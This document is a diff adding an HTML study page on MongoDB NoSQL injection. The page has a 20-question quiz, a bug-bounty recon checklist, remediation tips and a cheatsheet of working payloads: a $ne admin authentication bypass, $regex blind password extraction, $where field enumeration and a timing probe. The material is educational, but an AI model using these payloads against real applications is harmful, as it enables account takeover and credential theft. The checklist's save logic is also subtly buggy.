@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>NoSQL Injection — Exam & Recon Kit</title>
+<style>
+:root{
+  --bg:#0c0510; --panel:#150a1e; --line:#2a1a3d;
+  --text:#d0c0d4; --dim:#7a6a8a; --accent:#b14dff; --bad:#ff4d4d;
+  --mono:'JetBrains Mono','Fira Code','Consolas',monospace;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;}
+.wrap{max-width:720px;margin:0 auto;padding:32px 20px 60px;}
+.tag{color:var(--accent);letter-spacing:.15em;font-size:12px;text-transform:uppercase;font-weight:bold;text-shadow:0 0 5px var(--accent);}
+h1{font-size:22px;margin:6px 0 26px;color:#fff;text-shadow:0 0 8px rgba(177,77,255,0.3);}
+.bar{height:4px;background:var(--line);border-radius:2px;overflow:hidden;margin-bottom:22px;}
+.bar>div{height:100%;background:var(--accent);transition:width .3s;box-shadow:0 0 10px var(--accent);}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:22px;box-shadow:0 0 20px rgba(0,0,0,0.5);}
+.qnum{color:var(--dim);font-size:12px;margin-bottom:10px;}
+.qtext{font-size:16px;color:#fff;margin-bottom:18px;line-height:1.5;}
+.opt{display:block;width:100%;text-align:left;background:#0e0614;border:1px solid var(--line);
+  color:var(--text);padding:12px 14px;border-radius:7px;margin-bottom:10px;cursor:pointer;
+  font-family:var(--mono);font-size:13.5px;transition:.15s;}
+.opt:hover{border-color:var(--accent);background:#1a0a24;box-shadow:0 0 8px rgba(177,77,255,0.2);}
+.opt.correct{background:#220a2a;border-color:var(--accent);color:var(--accent);text-shadow:0 0 5px var(--accent);}
+.opt.wrong{background:#2a0a0a;border-color:var(--bad);color:var(--bad);text-shadow:0 0 5px var(--bad);}
+.opt[disabled]{cursor:default;}
+.score{color:var(--dim);font-size:13px;}
+.center{text-align:center;}
+.big{font-size:44px;color:var(--accent);margin:10px 0;text-shadow:0 0 15px var(--accent);}
+.btn{background:var(--accent);color:#0c0510;border:none;padding:12px 20px;border-radius:7px;
+  font-family:var(--mono);font-weight:bold;cursor:pointer;margin:6px 6px 0 0;font-size:13px;}
+.btn.alt{background:transparent;border:1px solid var(--accent);color:var(--accent);box-shadow:0 0 5px rgba(177,77,255,0.3);}
+.emoji{font-size:26px;position:fixed;top:-30px;animation:fall linear forwards;pointer-events:none;z-index:9999;text-shadow:0 0 10px var(--accent);}
+@keyframes fall{to{transform:translateY(105vh) rotate(360deg);opacity:.2;}}
+h2{color:#fff;font-size:15px;border-bottom:1px solid var(--line);padding-bottom:8px;margin-top:30px;}
+h3{color:var(--accent);font-size:14px;margin-top:20px;margin-bottom:5px;text-shadow:0 0 5px rgba(177,77,255,0.5);}
+.chk{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-bottom:1px dashed var(--line);font-size:13.5px;}
+.chk input{margin-top:3px;accent-color:var(--accent);}
+.chk.done label{color:var(--dim);text-decoration:line-through;}
+pre{background:#0e0614;border:1px solid var(--line);border-radius:7px;padding:12px 14px;
+  overflow-x:auto;font-size:12.5px;color:#f5e6ff;margin:8px 0 4px;box-shadow:inset 0 0 10px rgba(0,0,0,0.5);}
+.pname{color:var(--accent);font-size:12.5px;margin-top:16px;}
+#quizView,#kitView{display:none;}
+.explain{margin-top:12px;padding:12px 14px;background:#0e0614;border:1px solid var(--line);
+  border-radius:7px;font-size:13px;color:var(--dim);line-height:1.5;display:none;}
+.explain b{color:var(--accent);}
+.topbtn{margin-bottom:18px;}
+#nextBtn{display:none;margin-top:16px;}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="tag">WVAPT // NoSQL Injection</div>
+  <h1 id="pageTitle">Concept Check — 20 Questions</h1>
+
+  <div id="quizView">
+    <button class="btn alt topbtn" onclick="showKit()">Skip → Bug Bounty Checklist + Payloads</button>
+    <div class="bar"><div id="prog" style="width:0%"></div></div>
+    <div class="card">
+      <div class="qnum"><span id="qIndex">1</span>/20 &nbsp;·&nbsp; <span class="score">score: <span id="scoreLive">0</span></span></div>
+      <div class="qtext" id="qText"></div>
+      <div id="opts"></div>
+      <div class="explain" id="explain"></div>
+      <button class="btn" id="nextBtn" onclick="goNext()">Next →</button>
+    </div>
+  </div>
+
+  <div id="doneView" class="card center" style="display:none;">
+    <div class="tag">Result</div>
+    <div class="big"><span id="finalScore">0</span>/20</div>
+    <div id="finalMsg" style="color:var(--dim);margin-bottom:16px;"></div>
+    <button class="btn" onclick="restart()">Retake Exam</button>
+    <button class="btn alt" onclick="showKit()">Bug Bounty Checklist + Payloads →</button>
+  </div>
+
+  <div id="kitView">
+    <button class="btn alt" onclick="showQuiz()">← Back to Exam</button>
+
+    <h2>Recon Checklist</h2>
+    <div id="checklist"></div>
+
+    <h2>Payload Cheatsheet</h2>
+    <div id="payloads"></div>
+  </div>
+</div>
+
+<script>
+const Q=[
+["What is the root cause of a NoSQL Injection vulnerability?",["User input is inserted into a database query without proper validation/sanitization","Weak password policies are implemented across the application and database servers","Missing HTTPS encryption on the web application layer allows for interception","Open ports on the server expose internal database services to the public network"],0,
+"It occurs when user-controlled input is concatenated directly into database queries without sanitization."],
+["Which NoSQL database is primarily focused on throughout the study material?",["The MongoDB database system specifically","The Redis database system entirely","The Cassandra database system locally","The Elasticsearch database system securely"],0,
+"MongoDB is the primary target, utilizing JSON-like documents and operators vulnerable to injection."],
+["What is the primary purpose of fuzzing during NoSQL Injection testing?",["To detect whether user input is interpreted as part of the query","To significantly increase the overall server processing speed safely","To encrypt all outgoing requests and responses securely in transit","To bypass the authentication mechanism directly and access the admin"],0,
+"Fuzzing helps identify if special characters or syntax alter the database query logic."],
+["If adding a single quote (') changes the application's response, what does it usually indicate?",["Input may be reaching the database query unsanitized","A relational SQL server is installed on the backend server","The network firewall is enabled and blocking the payload","A session timeout occurred due to inactivity on the account"],0,
+"A response change suggests the quote broke the query syntax, indicating unsanitized input."],
+["Why are && 0 and && 1 commonly compared during testing?",["To confirm whether injected logic is actually executed","To determine the exact database version running locally","To increase the performance of the database server instantly","To detect cross-site scripting vulnerabilities in the app"],0,
+"If && 1 returns true and && 0 returns false, the injected logic is being executed by the database."],
+["What is the purpose of the trailing 'x' in payloads like fizzy' && 1 && 'x?",["To balance the remaining quote and keep syntax valid","To execute arbitrary JavaScript code on the server side","To encode the transmitted data securely during the request","To start a completely new database query from scratch"],0,
+"It closes the open string literal so the overall MongoDB syntax remains valid and doesn't error out."],
+["What does the payload '||'1'=='1 attempt to achieve?",["To always make the condition evaluate to TRUE securely","To encrypt the passwords stored in the database safely","To crash the MongoDB service running on the server","To disable the cookies stored in the victim's browser"],0,
+"By injecting an OR condition that is always true, it bypasses authentication logic."],
+["What is the purpose of a Null Byte (%00) injection?",["To truncate the remaining query so later conditions may be ignored","To encrypt the outgoing HTTP requests securely in transit","To compress the HTTP packets sent to the target server","To execute operating system commands on the host directly"],0,
+"Null bytes can terminate string processing in some backend languages, truncating the query."],
+["Which MongoDB operator means 'Not Equal'?",["The $ne operator in the database query","The $eq operator in the database query","The $gt operator in the database query","The $regex operator in the database query"],0,
+"$ne matches all documents where the field is not equal to the specified value."],
+["Which MongoDB operator is used for pattern matching?",["The $regex operator within the query","The $where operator within the query","The $or operator within the query","The $eq operator within the query"],0,
+"$regex allows searching for strings matching a specific regular expression pattern."],
+["Which MongoDB operator allows JavaScript expressions to be evaluated?",["The $where operator within the query","The $in operator within the query","The $eq operator within the query","The $lt operator within the query"],0,
+"The $where operator executes a JavaScript function for each document, enabling complex but dangerous logic."],
+["In a vulnerable login API, why can {\"password\":{\"$ne\":\"invalid\"}} be dangerous?",["It matches nearly every real password except invalid","It hashes the password securely before transmission","It deletes the password entry from the database","It creates a new administrative account instantly"],0,
+"It tells the database 'find a user where the password is NOT invalid', bypassing the actual check."],
+["During operator injection, why should the request usually use Content-Type: application/json?",["So MongoDB operators are parsed correctly as JSON objects","To compress the data sent over the network securely","To bypass the HTTPS encryption enforced by the server","To enable cross-site cookies for session management"],0,
+"Operators like $ne must be sent as JSON objects; URL encoding might not parse them correctly."],
+["Why is \"username\":\"administrator\" kept fixed while injecting $ne into the password field?",["To force authentication as the administrator account","To reduce the overall size of the HTTP request payload","To bypass the cross-site request forgery token check","To enable cross-origin resource sharing on the API"],0,
+"By targeting the admin user specifically and bypassing the password, you log in as the administrator."],
+["Which JavaScript function can be abused to enumerate MongoDB field names?",["The Object.keys() function in JavaScript","The Object.values() function in JavaScript","The JSON.parse() function in JavaScript","The parseInt() function in JavaScript"],0,
+"Using $where with Object.keys(this) can reveal hidden database schema fields via error messages."],
+["Why is $regex useful during blind NoSQL Injection?",["It helps extract secrets one character at a time safely","It encrypts the server responses to hide them locally","It creates new indexes to speed up the database","It disables the authentication mechanism entirely"],0,
+"By testing characters sequentially (e.g., ^a.*), attackers can infer the exact password."],
+["What is Blind NoSQL Injection?",["Inferring secret data through TRUE/FALSE behavior instead of directly seeing it","Reading the database backup files stored on the server locally","Uploading malicious files to the web server's root directory","Using DNS tunneling to exfiltrate data from the database"],0,
+"When the app doesn't return data directly, attackers infer it based on true/false responses."],
+["When visible responses never change, which technique can still confirm injection?",["Timing-based Injection technique securely","Cross-Site Request Forgery technique locally","Clickjacking user interface redress attack","XML External Entity injection attack safely"],0,
+"If boolean responses are unreliable, measuring time delays confirms the injection is executing."],
+["During Timing-Based NoSQL Injection, what indicates a successful condition?",["A measurable response delay (e.g., ~5 seconds)","An HTTP 404 Not Found error returned by server","A sudden redirect to the main login page instantly","A complete crash of the victim's web browser"],0,
+"Using functions like sleep() inside $where causes the response to delay if the condition is true."],
+["Which combination is considered the best defense against NoSQL Injection?",["Allowlist input validation, parameterized queries, and strict type checking","Disabling JavaScript execution on the client side browser entirely","Hiding the server banners to prevent version fingerprinting","Using longer passwords and changing them every 30 days"],0,
+"Sanitizing input and using safe database drivers that separate code from data prevents injection."]
+];
+
+const CHECKLIST_DATA = [
+  { title: "1. Fuzzing & Syntax Testing", items: [
+    "Inject a single quote <code>'</code> to see if response changes or throws a database error.",
+    "Compare responses of <code>&& 1</code> vs <code>&& 0</code> to confirm logic execution.",
+    "Use a trailing quote like <code>fizzy' && '1'=='1</code> to balance syntax."
+  ]},
+  { title: "2. Operator Injection (Auth Bypass)", items: [
+    "Change Content-Type to <code>application/json</code>.",
+    "Test auth bypass: <code>{\"username\":\"admin\",\"password\":{\"$ne\":\"invalid\"}}</code>.",
+    "Test boolean logic: <code>{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}</code>."
+  ]},
+  { title: "3. Data Exfiltration (Blind)", items: [
+    "Use <code>$regex</code> to extract passwords char-by-char: <code>{\"password\":{\"$regex\":\"^a\"}}</code>.",
+    "Use <code>$where</code> with <code>Object.keys()</code> to enumerate hidden field names."
+  ]},
+  { title: "4. Time-Based Blind", items: [
+    "If visible responses don't change, use timing: <code>{\"$where\":\"sleep(5000)\"}</code>.",
+    "Measure the HTTP response time to confirm a 5-second delay."
+  ]},
+  { title: "5. Remediation", items: [
+    "Ensure strict type checking (e.g., reject objects if a string is expected).",
+    "Use allowlists for acceptable input values.",
+    "Disable or restrict the use of <code>$where</code> operator if not needed."
+  ]}
+];
+
+const PAYLOADS = [
+  { name: "1. Auth Bypass (JSON)", code: "{\"username\":\"admin\",\"password\":{\"$ne\":\"invalid\"}}" },
+  { name: "2. Boolean Logic (URL)", code: "username=admin'+%26%26+'1'=='1&password=any" },
+  { name: "3. Field Enumeration ($where)", code: "{\"$where\":\"Object.keys(this)[0] == 'username'\"}" },
+  { name: "4. Regex Blind Exfil", code: "{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}" },
+  { name: "5. Time-Based", code: "{\"$where\":\"if(this.password[0]=='a'){sleep(5000)}\"}" }
+];
+
+let cur=0,score=0;
+
+function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
+
+function renderQ(){
+  document.getElementById('prog').style.width=(cur/Q.length*100)+'%';
+  document.getElementById('qIndex').textContent=cur+1;
+  document.getElementById('scoreLive').textContent=score;
+  const [text,opts,correctIdx,why]=Q[cur];
+  document.getElementById('qText').textContent=text;
+  const exp=document.getElementById('explain');
+  exp.style.display='none';exp.innerHTML='';
+  let arr=opts.map((o,i)=>({o,correct:i===correctIdx}));
+  shuffle(arr);
+  const box=document.getElementById('opts');
+  box.innerHTML='';
+  arr.forEach(item=>{
+    const b=document.createElement('button');
+    b.className='opt';b.textContent=item.o;
+    b.onclick=()=>pick(b,item.correct,box,item.o,why,arr);
+    box.appendChild(b);
+  });
+  document.getElementById('nextBtn').style.display='none';
+}
+
+function pick(btn,isCorrect,box,pickedText,why,arr){
+  [...box.children].forEach(c=>c.disabled=true);
+  const exp=document.getElementById('explain');
+  if(isCorrect){
+    btn.classList.add('correct');score++;
+    exp.innerHTML=`<b>Correct.</b> ${why}`;
+  }else{
+    btn.classList.add('wrong');
+    const correctText=arr.find(a=>a.correct).o;
+    [...box.children].forEach(c=>{if(c.textContent===correctText)c.classList.add('correct');});
+    exp.innerHTML=`<b>Correct answer:</b> ${correctText}<br>${why}`;
+  }
+  exp.style.display='block';
+  document.getElementById('scoreLive').textContent=score;
+  const nb=document.getElementById('nextBtn');
+  nb.style.display='inline-block';
+  nb.textContent=(cur+1<Q.length)?'Next →':'See Results →';
+}
+
+function goNext(){
+  cur++;
+  if(cur<Q.length)renderQ();else finish();
+}
+
+function finish(){
+  document.getElementById('prog').style.width='100%';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('doneView').style.display='block';
+  document.getElementById('finalScore').textContent=score;
+  const msg=score===20?"DATABASE ACCESSED. Full collection extracted.":
+    score>=15?"Solid grasp — revisit the weak spots.":
+    score>=10?"Halfway there — reread the tricky sections.":
+    "Go back through the concept steps before diving into labs.";
+  document.getElementById('finalMsg').textContent=msg;
+  if(score===20) confetti();
+}
+
+function confetti(){
+  const em=['🟣','💾','🔑','🧩','🕷️'];
+  for(let i=0;i<30;i++){
+    setTimeout(()=>{
+      const s=document.createElement('div');
+      s.className='emoji';s.textContent=em[Math.floor(Math.random()*em.length)];
+      s.style.left=Math.random()*100+'vw';
+      s.style.animationDuration=(2+Math.random()*1.5)+'s';
+      document.body.appendChild(s);
+      setTimeout(()=>s.remove(),4000);
+    },i*60);
+  }
+}
+
+function restart(){
+  cur=0;score=0;
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('kitView').style.display='none';
+  document.getElementById('quizView').style.display='block';
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+  renderQ();
+}
+
+let cameFromDone=false;
+function showKit(){
+  cameFromDone=document.getElementById('doneView').style.display==='block';
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('kitView').style.display='block';
+  document.getElementById('pageTitle').textContent='Bug Bounty Recon Kit';
+}
+function showQuiz(){
+  document.getElementById('kitView').style.display='none';
+  if(cameFromDone){
+    document.getElementById('doneView').style.display='block';
+  }else{
+    document.getElementById('quizView').style.display='block';
+  }
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+}
+
+function buildChecklist(){
+  const c=document.getElementById('checklist');
+  const saved=JSON.parse(localStorage.getItem('nosql_cyber_v1')||'{}');
+  let html='';
+  let idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    html += `<h3>${section.title}</h3>`;
+    section.items.forEach(item => {
+      const isChecked = saved[idx] ? 'checked' : '';
+      const isDone = saved[idx] ? ' done' : '';
+      html += `<div class="chk${isDone}">
+        <input type="checkbox" id="c${idx}" ${isChecked}>
+        <label for="c${idx}">${item}</label>
+      </div>`;
+      idx++;
+    });
+  });
+  c.innerHTML = html;
+  
+  idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    section.items.forEach(item => {
+      const checkbox = document.getElementById(`c${idx}`);
+      const row = checkbox.parentElement;
+      checkbox.onchange = e => {
+        saved[idx] = e.target.checked;
+        localStorage.setItem('nosql_cyber_v1', JSON.stringify(saved));
+        row.classList.toggle('done', e.target.checked);
+      };
+      idx++;
+    });
+  });
+}
+
+function buildPayloads(){
+  const p=document.getElementById('payloads');
+  let html='';
+  const esc = s => s.replace(/</g, '&lt;').replace(/>/g, '&gt;'); // Prevent live HTML execution
+  PAYLOADS.forEach(item => {
+    html += `<div class="pname">${item.name}</div><pre>${esc(item.code)}</pre>`;
+  });
+  p.innerHTML = html;
+}
+
+document.getElementById('quizView').style.display='block';
+renderQ();
+buildChecklist();
+buildPayloads();
+</script>
+</body>
+</html>
